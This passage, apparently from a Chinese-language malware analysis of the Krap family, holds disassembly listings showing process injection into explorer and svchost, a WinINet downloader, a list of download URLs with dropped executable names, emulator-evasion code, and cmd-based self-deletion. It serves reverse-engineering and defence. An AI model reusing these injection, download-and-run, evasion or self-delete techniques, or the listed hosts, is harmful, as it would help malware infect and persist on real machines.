00E21FAD    FF15 9C30E200   call dword ptr ds:[E2309C]                   ; kernel32.ResumeThread
00E21FB3    56              push esi
00E21FB4    FF15 3C30E200   call dword ptr ds:[E2303C]                   ; kernel32.ExitThread
```

`explorer` 中的注入代码执行完后自动退出。

### 5. 傀儡进程 Svchost.exe 完成 download 功能

`svchost.exe` 主要链接网络下载其它病毒。

```
004013B2    FF15 18304000   call dword ptr ds:[403018]                   ; kernel32.lstrcatA
004013B8    8B3D F8304000   mov edi,dword ptr ds:[<&WS2_32.WSAGetLast>; WININET.InternetReadFile
004013BE    895D E4         mov dword ptr ss:[ebp-1C],ebx
004013C1    56              push esi
004013C2    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]
004013C8    53              push ebx
004013C9    50              push eax
004013CA    E8 D8080000     call __krap_.00401CA7
004013CF    83C4 0C         add esp,0C
004013D2    53              push ebx
004013D3    53              push ebx
004013D4    53              push ebx
004013D5    53              push ebx
004013D6    8D85 08F6FFFF   lea eax,dword ptr ss:[ebp-9F8]
004013DC    50              push eax
004013DD    8975 E8         mov dword ptr ss:[ebp-18],esi
004013E0    FF15 E8304000   call dword ptr ds:[<&SHELL32.Shell_Notif>; WININET.InternetOpenA
004013E6    395D E4         cmp dword ptr ss:[ebp-1C],ebx
004013E9    53              push ebx
004013EA    53              push ebx
004013EB    53              push ebx
004013EC    8945 F4         mov dword ptr ss:[ebp-C],eax
004013EF    53              push ebx
004013F0    8D8D 08FEFFFF   lea ecx,dword ptr ss:[ebp-1F8]
004013F6    74 06           je short __krap_.004013FE
004013F8    8D8D 88FEFFFF   lea ecx,dword ptr ss:[ebp-178]
004013FE    51              push ecx
004013FF    50              push eax
00401400    FF15 E4304000   call dword ptr ds:[<&SHELL32.SHGetFileIn>; WININET.InternetOpenUrlA
```



## 反汇编代码片段

```
00401406    6A 04            push 4  

00401408    8945 08         mov dword ptr ss:[ebp+8],eax  

0040140B    8D45 E0         lea eax,dword ptr ss:[ebp-20]  

0040140E    50              push eax  

0040140F    6A 02           push 2  

00401411    FF75 F4         push dword ptr ss:[ebp-C]  

00401414    FF15 EC304000   call dword ptr ds:[4030EC]                 ; WININET.InternetSetOptionA  

0040141A    6A 04           push 4  

0040141C    8D45 E0         lea eax,dword ptr ss:[ebp-20]  

0040141F    50              push eax  

00401420    6A 06           push 6  

00401422    FF75 F4         push dword ptr ss:[ebp-C]  

00401425    FF15 EC304000   call dword ptr ds:[4030EC]                 ; WININET.InternetSetOptionA  

0040142B    6A 04           push 4  

0040142D    8D45 E0         lea eax,dword ptr ss:[ebp-20]  

00401430    50              push eax  

00401431    6A 05           push 5  

00401433    FF75 F4         push dword ptr ss:[ebp-C]  

00401436    FF15 EC304000   call dword ptr ds:[4030EC]                 ; WININET.InternetSetOptionA  

0040143C    53              push ebx  

0040143D    8D45 FC         lea eax,dword ptr ss:[ebp-4]  

00401440    50              push eax  

00401441    8D45 EC         lea eax,dword ptr ss:[ebp-14]  

00401444    50              push eax  

00401445    68 05000020     push 20000005  

0040144A    FF75 08         push dword ptr ss:[ebp+8]  

0040144D    895D EC         mov dword ptr ss:[ebp-14],ebx  

00401450    C745 FC 0400000>mov dword ptr ss:[ebp-4],4  

00401457    FF15 F0304000   call dword ptr ds:[<&comdlg32.GetFileTit]; WININET.HttpQueryInfoA  

0040145D    8B45 EC         mov eax,dword ptr ss:[ebp-14]  

00401460    3BC6            cmp eax,esi  

00401462    0F86 8C000000   jbe __krap_.004014F4  

00401468    53              push ebx  

00401469    68 80000000     push 80  

0040146E    6A 04           push 4  

00401470    53              push ebx  

00401471    6A 02           push 2  

00401473    68 00000040     push 40000000  

00401478    8D85 08FFFFFF   lea eax,dword ptr ss:[ebp-F8]  

0040147E    50              push eax  

0040147F    FF15 4C304000   call dword ptr ds:[40304C]                 ; kernel32.CreateFileA  

00401485    56              push esi  

00401486    8945 F0         mov dword ptr ss:[ebp-10],eax  

00401489    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]  

0040148F    53              push ebx  

00401490    50              push eax  

00401491    895D FC         mov dword ptr ss:[ebp-4],ebx  

00401494    E8 0E080000     call __krap_.00401CA7  

00401499    EB 2D           jmp short __krap_.004014C8  

0040149B    3AC3            cmp al,bl  

0040149D    74 4A           je short __krap_.004014E9  

0040149F    53              push ebx  

004014A0    8D45 DC         lea eax,dword ptr ss:[ebp-24]  

004014A3    50              push eax  

004014A4    FF75 FC         push dword ptr ss:[ebp-4]  

004014A7    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]  

004014AD    50              push eax  

004014AE    FF75 F0         push dword ptr ss:[ebp-10]  

004014B1    FF15 48304000   call dword ptr ds:[403048]                 ; kernel32.WriteFile  

004014B7    56              push esi  

004014B8    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]  

004014BE    53              push ebx  

004014BF    50              push eax  

004014C0    E8 E2070000     call __krap_.00401CA7  

004014C5    895D FC         mov dword ptr ss:[ebp-4],ebx  

004014C8    83C4 0C         add esp,0C  

004014CB    8D45 FC         lea eax,dword ptr ss:[ebp-4]  

004014CE    50              push eax  

004014CF    56              push esi  

004014D0    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]  

004014D6    50              push eax  

004014D7    FF75 08         push dword ptr ss:[ebp+8]  

004014DA    8975 E8         mov dword ptr ss:[ebp-18],esi  

004014DD    FFD7            call edi  

004014DF    85C0            test eax,eax  

004014E1    0F95C0          setne al  

004014E4    395D FC         cmp dword ptr ss:[ebp-4],ebx  

004014E7    77 B2           ja short __krap_.0040149B  

004014E9    FF75 F0         push dword ptr ss:[ebp-10]  

004014EC    FF15 2C304000   call dword ptr ds:[40302C]                 ; kernel32.CloseHandle  

004014F2    EB 13           jmp short __krap_.00401507  

004014F4    83C0 FE         add eax,-2  

004014F7    3D FE030000     cmp eax,3FE  

004014FC    77 09           ja short __krap_.00401507  

004014FE    885D FB         mov byte ptr ss:[ebp-5],bl  

00401501    EB 04           jmp short __krap_.00401507  

00401503    3AC3            cmp al,bl  

00401505    74 1B           je short __krap_.00401522  

00401507    8D45 FC         lea eax,dword ptr ss:[ebp-4]  

0040150A    50              push eax  

0040150B    56              push esi  

0040150C    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]  

00401512    50              push eax  

00401513    FF75 08         push dword ptr ss:[ebp+8]  

00401516    FFD7            call edi  
```

## 关联网络及下载病毒列表

链接的网络及下载的要运行的病毒包括不限于下面这些：

```
0012E584   0012E834  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\nvdwyuf.exe"  

0012E590   0012E7B4  ASCII "http://dbcorps.com/ibemh/oovqlsahc.php?adv=adv468"   

0012E59C   0012E734  ASCII "http://cbphase.com/ibemh/oovqlsahc.php?adv=adv468" 

0012E584   0012E9B4  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\rrtmxa.exe"

0012E584   0012EB34  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\hrbnufy.exe" 

0012E590   0012EAB4  ASCII "http://dbcorps.com/ibemh/rhlgoidbwq.php?adv=adv468"    

0012E584   0012ECB4  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\qgrirjoc.exe" 

0012E590   0012EC34  ASCII "http://dbcorps.com/ibemh/erztbwqyg.php?adv=adv468"   

0012E584   0012EE34  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\wsxguopp.exe"

0012E590   0012EDB4  ASCII "http://dbcorps.com/ibemh/aaick.php?adv=adv468" 

0012E584   0012EFB4  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\edsycb.exe" 

0012E590   0012EF34  ASCII "http://dbcorps.com/ibemh/xbsnusnvp.php?adv=adv468" 

0012E584   0012F134  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\nped.exe"   

0012E59C   0012F034  ASCII "http://cbphase.com/ibemh/cfjeyt.php?adv=adv468" 

0012E584   0012F2B4  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\njnosbp.exe"   

0012E59C   0012F1B4  ASCII "http://cbphase.com/ibemh/imdysnucxe.php?adv=adv468" 

0012E584   0012F434  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\eqyleiv.exe"    

0012E59C   0012F334  ASCII "http://cbphase.com/ibemh/gtbwqys.php?adv=adv468" 

0012E584   0012F5B4  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\gbrel.exe"
```

...

## 绕过 AVer 虚拟机代码

里面还使用了一些绕 AVer 虚拟机的代码：

```
0014101A    6A 00           push 0  

0014101C    8D45 FC         lea eax,dword ptr ss:[ebp-4]  

0014101F    50              push eax  

00141020    6A 01           push 1  

00141022    E8 37110000     call 0014215E          // call ddraw.DirectDrawCreate，没仿真这个就挂了 :(  

00141027    85C0            test eax,eax  

00141029    74 04           je short 0014102F  

0014102B    33C0            xor eax,eax  

0014102D    C9              leave  

0014102E    C3              retn  

0014102F    8B45 FC         mov eax,dword ptr ss:[ebp-4]  

00141032    8B08            mov ecx,dword ptr ds:[eax]  
```

在上面这些代码执行完毕后进行自删除。



```
0014110E    FF15 24301400   call dword ptr ds:[143024]            ; kernel32.GetShortPathNameA  
00141114    56              push esi  
00141115    8D85 B8FCFFFF   lea eax,dword ptr ss:[ebp-348]  
0014111B    50              push eax  
0014111C    68 20311400     push 143120                          ; ASCII "COMSPEC"  
00141121    FF15 20301400   call dword ptr ds:[143020]           ; kernel32.GetEnvironmentVariableA  
00141127    68 18311400     push 143118                          ; ASCII "/c del "    
0014114D    FFD6            call esi  
0014114F    68 10311400     push 143110                          ; ASCII " > nul"  
00141154    8D85 BCFDFFFF   lea eax,dword ptr ss:[ebp-244]  
0014115A    50              push eax  
0014115B    FFD6            call esi  
0014115D    8D85 B8FCFFFF   lea eax,dword ptr ss:[ebp-348]  
```

// 启动 `cmd.exe` 删除

```
00141176    C745 C4 3C00000>mov dword ptr ss:[ebp-3C],3C  
0014117D    897D CC         mov dword ptr ss:[ebp-34],edi  
00141180    C745 D0 0831140>mov dword ptr ss:[ebp-30],143108     ; ASCII "Open"  
00141187    897D DC         mov dword ptr ss:[ebp-24],edi  
0014118A    897D E0         mov dword ptr ss:[ebp-20],edi  
0014118D    8975 C8         mov dword ptr ss:[ebp-38],esi  
00141190    FF15 D0301400   call dword ptr ds:[1430D0]           ; shell32.ShellExecuteExA  
001411A4    FFD6            call esi                             ; kernel32.SetPriorityClass  
001411A6    68 00010000     push 100  
001411AB    FF15 A8301400   call dword ptr ds:[1430A8]           ; kernel32.GetCurrentProcess  
001411B1    50              push eax  
001411B2    FFD6            call esi  
001411B4    6A 0F           push 0F  
001411B6    FF15 A4301400   call dword ptr ds:[1430A4]           ; kernel32.GetCurrentThread  
001411BC    50              push eax  
001411BD    FF15 AC301400   call dword ptr ds:[1430AC]           ; kernel32.SetThreadPriority  
001411C3    57              push edi  
001411C4    8D85 C0FEFFFF   lea eax,dword ptr ss:[ebp-140]  
001411CA    50              push eax  
001411CB    6A 01           push 1  
001411CD    6A 04           push 4  
001411CF    FF15 D4301400   call dword ptr ds:[1430D4]           ; shell32.SHChangeNotify   自删除自身。  
001411D5    57              push edi  
001411D6    FF15 B0301400   call dword ptr ds:[1430B0]           ; kernel32.ExitProcess  
```

## 6. 调试中的一些技巧

由于病毒的主程序使用了连续注入的方式，使得分析并不是十分容易。我们需要分析被注入的 `explorer` 和在 `explorer` 中分析要被注入 `svchost`。直接分析 `explorer` 会很不方便，`explorer` 挂起后，很多操作都失去了响应。

这里的一个办法是修改注入时的进程名，比如放一个替罪羊程序过去改名叫 `expl0rer`，这样就容易调试了，同理，在 `expl0rer` 注入时，放同样替罪羊程序改名叫 `svch0st.exe` 即可。

由于 `svch0st.exe` 是被挂起的方式创建的，此时 `Ollydbg` 不方便 `attach` 上去调试。这里可以先找到那块注入的在 `svch0st.exe` 代码开始位置，用 `icesword`，修改内存，把开头的指令修改为一个死循环。

比如一个函数的开头是这个：

```
00401097 >  55              push ebp  
00401098    8BEC            mov ebp,esp  
```

修改为：

```
00401097 >- E2 FE          loopd short __krap_.<00401097>  
00401099    90              nop  
```

当 `expl0rer.exe` 调用 `ResumeThread` 后，再去用 `Ollydbg` `attach` 即可。

下面总结了一些分析时比较有用的断点，依次下断点即可。

**病毒主程序中**：

`4011DF`（第一次解密完成） `009226AC`（内存中解密完毕） `0040807E`（二次解密） `00402114`（此时可修改 `explorer` 为 `expl0rer`）

`00401E7D`（计算注入点函数入口偏移，调用 `CreateRemoteThread`，此时可去 `expl0rer.exe` 中设置断点）

**`expl0rer` 中断点**：由于映射的基址不同，所以 `??` 的地方是每个机器中的具体地址，比如我映射的是 `BE0000` 这个基址，那么断点就是 `00BE1F3C`，和 `00BE1E80`。

`00??1f3c`（此时可修改 `svchost` 为 `svch0st`）
`00??1e80`（此时可计算出注入 `svch0st` 中的代码地址，用来下断点）

`svch0st` 中的直接分析即可了。

以上就是关于 `Krap` 家族的解密方式及 `ao` 变种，`download` 下来的东西就不分析了太多了 :)。

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## 上传的附件

| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) | `b4703830c36f9b4d5b5be6269b827842.rar` |
| :--- | :--- |
